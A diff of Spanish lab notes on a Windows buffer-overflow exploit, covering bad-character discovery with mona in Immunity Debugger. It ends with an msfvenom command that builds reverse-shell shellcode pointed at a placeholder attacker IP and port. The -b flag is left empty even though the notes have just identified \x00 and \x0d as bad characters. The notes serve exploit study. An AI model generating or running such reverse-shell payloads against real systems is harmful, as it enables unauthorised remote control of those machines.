@@ -84,7 +84,26 @@ en este caso lo haremos desde [[Inmunnity Debugger]] con [[mona (python)]]
 !mona bytearray -cpb "\x00"
 ```
 
-> recordar qeu este crea todas las configuraciones de \x _ _, es decir, de la \x00 a \xff
+> recordar qeu este crea todas las configuraciones de `\x_ _`, es decir, de la `\x00` a `\xff`
 
 luego eso va a quedar en una carpeta definida en un .txt. quedaria tranferirse de alguna forma ese archivo a la mquina atacante, en el lab se lo hace por [[SMB - Transferencia de archivos por SMB]]
+
+y ahi es cuestion de ir probando, ya que esa secuencia estara metida dentro del stack.
+
+Luego de volver a probar quedaria ir viendo en el dump de las seccion es de memoria si falta algo o se sallta. o sino se puede hacer
+
+```python
+!mona compare \xESP -f RUTA_PARA_EL_OUTPUT.bin
+```
+
+> \xESP debe ser la direccion del Registro ESP
+
+ahi nos damos cuenta que ademas del `\x00` falta el `\x0d`
+
+
+como ya sabemos que son esos dos poruqe no hay mas badchars generamos entonces el shellcode con [[msfvenom]]
+
+```shell
+msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=IP_ATACANTE LPORT=PUERTO_ATACANTE -e x86/shikata_ga_nai EXITFUNC=thread -f c -b ""
+```
 
